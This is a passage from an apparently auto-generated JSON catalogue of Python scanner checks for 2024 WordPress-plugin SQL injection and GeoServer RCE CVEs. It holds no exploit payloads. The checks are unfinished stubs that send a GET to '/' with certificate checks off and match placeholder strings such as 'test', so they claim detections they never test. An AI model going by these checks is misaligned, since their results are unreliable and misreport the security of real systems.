body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Mura/Masa CMS - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_32640(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "sqli",
          "cms",
          "masa",
          "masacms",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_3552",
        "name": "Web Directory Free < 1.7.0 - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection with different techniques like UNION, Time-Based and Error-Based.",
        "severity": "critical",
        "detection": "[OR] mot(s) '/wp-content/plugins/web-directory-free' / [OR] DSL: duration>=6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-3552\nName: Web Directory Free < 1.7.0 - SQL Injection\nSeverity: critical\nDescription: The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection with different techniques like UNION, Time-Based and Error-Based.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_3552:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-3552\"\n    SEVERITY = \"critical\"\n    NAME = \"Web Directory Free < 1.7.0 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) '/wp-content/plugins/web-directory-free' / [OR] DSL: duration>=6; status_code == 200\"\n\n        # Simple word matcher simulation\n        matchers = ['/wp-content/plugins/web-directory-free']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Web Directory Free < 1.7.0 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_3552(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-3552\nName: Web Directory Free < 1.7.0 - SQL Injection\nSeverity: critical\nDescription: The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection with different techniques like UNION, Time-Based and Error-Based.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_3552:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-3552\"\n    SEVERITY = \"critical\"\n    NAME = \"Web Directory Free < 1.7.0 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) '/wp-content/plugins/web-directory-free' / [OR] DSL: duration>=6; status_code == 200\"\n\n        # Simple word matcher simulation\n        matchers = ['/wp-content/plugins/web-directory-free']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Web Directory Free < 1.7.0 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_3552(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "time-based-sqli",
          "cve",
          "cve2024",
          "wordpress",
          "wp-plugin",
          "wpscan",
          "wp",
          "web-directory-free",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_3605",
        "name": "WP Hotel Booking <= 2.1.0 - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The WP Hotel Booking plugin for WordPress is vulnerable to SQL Injection via the 'room_type' parameter of the /wphb/v1/rooms/search-rooms REST API endpoint in all versions up to, and including, 2.1.0 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200 / [OR] DSL: duration >= 6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-3605\nName: WP Hotel Booking <= 2.1.0 - SQL Injection\nSeverity: critical\nDescription: The WP Hotel Booking plugin for WordPress is vulnerable to SQL Injection via the 'room_type' parameter of the /wphb/v1/rooms/search-rooms REST API endpoint in all versions up to, and including, 2.1.0 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_3605:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-3605\"\n    SEVERITY = \"critical\"\n    NAME = \"WP Hotel Booking <= 2.1.0 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200 / [OR] DSL: duration >= 6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WP Hotel Booking <= 2.1.0 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_3605(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-3605\nName: WP Hotel Booking <= 2.1.0 - SQL Injection\nSeverity: critical\nDescription: The WP Hotel Booking plugin for WordPress is vulnerable to SQL Injection via the 'room_type' parameter of the /wphb/v1/rooms/search-rooms REST API endpoint in all versions up to, and including, 2.1.0 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_3605:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-3605\"\n    SEVERITY = \"critical\"\n    NAME = \"WP Hotel Booking <= 2.1.0 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200 / [OR] DSL: duration >= 6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WP Hotel Booking <= 2.1.0 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_3605(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "sqli",
          "wp",
          "wordpress",
          "wp-plugin",
          "wp-hotel-booking",
          "unauth",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_36401",
        "name": "GeoServer RCE in Evaluating Property Name Expressions",
        "language": "Python",
        "famille": "CVE",
        "description": "In the GeoServer version prior to 2.25.1, 2.24.3 and 2.23.5 of GeoServer, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'dns' | mot(s) 'application/xml'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-36401\nName: GeoServer RCE in Evaluating Property Name Expressions\nSeverity: critical\nDescription: In the GeoServer version prior to 2.25.1, 2.24.3 and 2.23.5 of GeoServer, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_36401:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-36401\"\n    SEVERITY = \"critical\"\n    NAME = \"GeoServer RCE in Evaluating Property Name Expressions\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            